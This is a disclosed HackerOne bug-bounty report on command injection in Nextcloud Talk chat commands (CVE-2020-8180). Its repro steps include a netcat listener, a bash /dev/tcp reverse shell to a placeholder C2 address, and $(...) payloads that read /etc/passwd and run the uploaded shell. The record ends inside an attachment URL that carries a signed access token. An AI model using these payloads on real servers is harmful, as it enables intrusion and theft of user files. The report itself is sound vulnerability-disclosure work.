{"id":851807,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTE4MDc=","url":"https://hackerone.com/reports/851807","title":"Code injection possible with malformed Nextcloud Talk chat commands","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-04-16T20:44:33.101Z","submitted_at":"2020-04-16T20:44:33.101Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"covert-spectre","url":"/covert-spectre","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8180"],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-02T14:54:13.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-06-02T14:52:51.598Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nThe Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \"/command\" syntax. Users can provide additional arguments to the commands, such as \"/calc 1+1\" or \"/wiki Hello\", which are passed to the underlying script using `@exec`. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax `/wiki test $(mycommand)`. This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.\n\n## Links\n- https://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands\n- https://github.com/nextcloud/spreed/issues/1566\n- https://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103\n\n## Severity\nThis bug has been filed with a severity of `Critical` inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user. \n\n## Affected Versions\nAll versions that support Talk Commands appear to be affected as the bug is in the `@execute` command. \nThe following version were tested: \n- master-2020-04-15 via `snap install nextcloud --edge`, `occ.status versionstring: 19.0.0 beta 2`\n- 17.0.5snap1 via `snap install nextcloud`, `occ.status versionstring: 17.0.5`\n\n## Repro Steps\n1. Install and Setup Nextcloud\n   1. create Ubuntu 18.04 VM\n   2. install Nextcloud Server (Nextcloud Hub snap used for this test `snap install nextcloud --edge`)\n   3. run install command: `nextcloud.manual-install \"admin\" \"password\"`\n   4. generate self signed certificate `nextcloud.enable-https self-signed`\n   5. set trusted domains `nextcloud.occ config:system:set trusted_domains 1 --value=\u003cdomain/ip\u003e`\n   6. create user `alice`\n   7. install and enable spreed/talk app\n   8. enable sample talk commands `nextcloud.occ talk:command:add-samples`\n   9. add calculator command as described in the [documentation here](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh)\n\n2. Setup C2 VM\n   1. kali used for this test, can be any host with netcat `nc`\n   2. run nc listener `nc -l -p 8888`\n3. Create Shell Script \u003e shell.sh\n   \u003e This script can be anything that gets executed and returns a shell\n   \u003e In this case, a simple reverse shell is initiated using bash interactive piping to /dev/tcp\n   \u003e A php web shell, meterpreter binary or any other executable could be uploaded here\n   ```\n   bash -i \u003e\u0026 /dev/tcp/\u003cc2-ip-here\u003e/8888 0\u003e\u00261 \u0026\n   ```\n4. Log In As Alice and Upload File\n   1. upload above shell.sh to root directory of alice's Nexcloud files\n\n5. With Alice, start a Talk Conversation\n\n6. Test Exploitability:\n    \u003e Note, all commands appear to get successfully executed, however whether output is shown depends on the implementation of the backing script. For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh) can show the output because it has an echo command in the scrpt. \n    ```\n    /wiki test $(id)\n    /wiki test $(pwd)\n    /wiki test $(ls -al .)\n    /calc test $(cat /etc/passwd)\n    /calc test $(ls -al ../)\n    ```\n\n7. Execute Reverse Shell\n   1. Locate uploaded shell script \n      1. For nextcloud snap, the data directory is defined [here](https://github.com/nextcloud/nextcloud-snap#where-is-my-stuff)\n      2. File locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script\n      3. Can use `/calc test $(ls ../)` to explore directory structure\n   2. Enable execution of the script\n   3. Execute the script\n    ```\n    /wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n    /wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n    ```\n\n8. Observer C2 Listener for Connection\n\n9. Run Commands via C2\n    ```\n    id \n    pwd\n    cd /var/snap/nextcloud/common/nextcloud/data/admin/files\n    ls -al\n    occ status\n    ```\n\n## Attachments\nSee attached screenshots\n\n## Impact\n\n- Complete access to all user files\n- Shell access to occ\n- Shell access to host machine - root access if Nextcloud is running as root","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThe Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \u0026quot;/command\u0026quot; syntax. Users can provide additional arguments to the commands, such as \u0026quot;/calc 1+1\u0026quot; or \u0026quot;/wiki Hello\u0026quot;, which are passed to the underlying script using \u003ccode\u003e@exec\u003c/code\u003e. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax \u003ccode\u003e/wiki test $(mycommand)\u003c/code\u003e. This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.\u003c/p\u003e\n\n\u003ch2 id=\"links\"\u003eLinks\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands\" href=\"/redirect?url=https%3A%2F%2Fnextcloud-talk.readthedocs.io%2Fen%2Flatest%2Fcommands%2F%23chat-commands\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/nextcloud/spreed/issues/1566\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fspreed%2Fissues%2F1566\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/spreed/issues/1566\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fspreed%2Fblob%2F384f39ded1dceab58491555744bd5326f8ff1e3f%2Flib%2FChat%2FCommand%2FShellExecutor.php%23L103\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"severity\"\u003eSeverity\u003c/h2\u003e\n\n\u003cp\u003eThis bug has been filed with a severity of \u003ccode\u003eCritical\u003c/code\u003e inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user. \u003c/p\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAffected Versions\u003c/h2\u003e\n\n\u003cp\u003eAll versions that support Talk Commands appear to be affected as the bug is in the \u003ccode\u003e@execute\u003c/code\u003e command. \u003cbr\u003e\nThe following version were tested: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003emaster-2020-04-15 via \u003ccode\u003esnap install nextcloud --edge\u003c/code\u003e, \u003ccode\u003eocc.status versionstring: 19.0.0 beta 2\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e17.0.5snap1 via \u003ccode\u003esnap install nextcloud\u003c/code\u003e, \u003ccode\u003eocc.status versionstring: 17.0.5\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"repro-steps\"\u003eRepro Steps\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eInstall and Setup Nextcloud\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ecreate Ubuntu 18.04 VM\u003c/li\u003e\n\u003cli\u003einstall Nextcloud Server (Nextcloud Hub snap used for this test \u003ccode\u003esnap install nextcloud --edge\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003erun install command: \u003ccode\u003enextcloud.manual-install \u0026quot;admin\u0026quot; \u0026quot;password\u0026quot;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003egenerate self signed certificate \u003ccode\u003enextcloud.enable-https self-signed\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eset trusted domains \u003ccode\u003enextcloud.occ config:system:set trusted_domains 1 --value=\u0026lt;domain/ip\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003ecreate user \u003ccode\u003ealice\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003einstall and enable spreed/talk app\u003c/li\u003e\n\u003cli\u003eenable sample talk commands \u003ccode\u003enextcloud.occ talk:command:add-samples\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eadd calculator command as described in the \u003ca href=\"/redirect?url=https%3A%2F%2Fnextcloud-talk.readthedocs.io%2Fen%2Flatest%2Fcommands%2F%23create-pathtocalcsh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edocumentation here\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSetup C2 VM\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ekali used for this test, can be any host with netcat \u003ccode\u003enc\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun nc listener \u003ccode\u003enc -l -p 8888\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate Shell Script \u0026gt; shell.sh\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis script can be anything that gets executed and returns a shell\u003cbr\u003e\nIn this case, a simple reverse shell is initiated using bash interactive piping to /dev/tcp\u003cbr\u003e\nA php web shell, meterpreter binary or any other executable could be uploaded here\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;c2-ip-here\u0026gt;/8888 0\u0026gt;\u0026amp;1 \u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLog In As Alice and Upload File\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eupload above shell.sh to root directory of alice\u0026#39;s Nexcloud files\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWith Alice, start a Talk Conversation\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTest Exploitability:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eNote, all commands appear to get successfully executed, however whether output is shown depends on the implementation of the backing script. For example, /wiki cannot show the results of \u003ccode\u003ecat /etc/passwd\u003c/code\u003e because the multiline output breaks the wiki script, but the \u003ca href=\"/redirect?url=https%3A%2F%2Fnextcloud-talk.readthedocs.io%2Fen%2Flatest%2Fcommands%2F%23create-pathtocalcsh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ecalculator sample\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e can show the output because it has an echo command in the scrpt. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/wiki test $(id)\n/wiki test $(pwd)\n/wiki test $(ls -al .)\n/calc test $(cat /etc/passwd)\n/calc test $(ls -al ../)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExecute Reverse Shell\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLocate uploaded shell script \n\n\u003col\u003e\n\u003cli\u003eFor nextcloud snap, the data directory is defined \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fnextcloud-snap%23where-is-my-stuff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eFile locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script\u003c/li\u003e\n\u003cli\u003eCan use \u003ccode\u003e/calc test $(ls ../)\u003c/code\u003e to explore directory structure\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eEnable execution of the script\u003c/li\u003e\n\u003cli\u003eExecute the script\n\u003ccode\u003e\n/wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n/wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eObserver C2 Listener for Connection\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRun Commands via C2\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eid \npwd\ncd /var/snap/nextcloud/common/nextcloud/data/admin/files\nls -al\nocc status\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"attachments\"\u003eAttachments\u003c/h2\u003e\n\n\u003cp\u003eSee attached screenshots\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eComplete access to all user files\u003c/li\u003e\n\u003cli\u003eShell access to occ\u003c/li\u003e\n\u003cli\u003eShell access to host machine - root access if Nextcloud is running as root\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":791692,"file_name":"2._alice-files.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aKHaS1qCGRA9noysaT12Ug6N?response-content-disposition=attachment%3B%20filename%3D%222._alice-files.png%22%3B%20filename%2A%3DUTF-8%27%272._alice-files.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=d78c2471c8d27f0005b7f6809474049e73f7ed0b045a6cd958062cdc8cbb8b51","file_size":79117,"type":"image/png"},{"id":791693,"file_name":"1._install.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Tau1uQHfNZ4wiRhDBMrTKnkC?response-content-disposition=attachment%3B%20filename%3D%221._install.png%22%3B%20filename%2A%3DUTF-8%27%271._install.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=1180a07d79764aa920c1d8c6f86e6f8b6e2ed52c6c4247e45f1a96fe902e1cf9","file_size":125946,"type":"image/png"},{"id":791694,"file_name":"3._output-ls.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dAxPFj25KCymHeYHEyYQEPAV?response-content-disposition=attachment%3B%20filename%3D%223._output-ls.png%22%3B%20filename%2A%3DUTF-8%27%273._output-ls.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=adbaad410992068712a3ce47d88effb42999e0fde5d398eb82c785feb3d49510","file_size":243431,"type":"image/png"},{"id":791695,"file_name":"4._output-passwd.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SiYueQ9iHvDr6VBv8pmxJW6Z?response-content-disposition=attachment%3B%20filename%3D%224._output-passwd.png%22%3B%20filename%2A%3DUTF-8%27%274._output-passwd.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=446ead33fbec32fce35f43533db2873e267ae747bd3d34da3d4ff8c92a1cd519","file_size":284307,"type":"image/png"},{"id":791696,"file_name":"5._reverse-shell.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jEGuXoxYGFKzpbnQM2QFQBr9?response-content-disposition=attachment%3B%20filename%3D%225._reverse-shell.png%22%3B%20filename%2A%3DUTF-8%27%275._reverse-shell.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2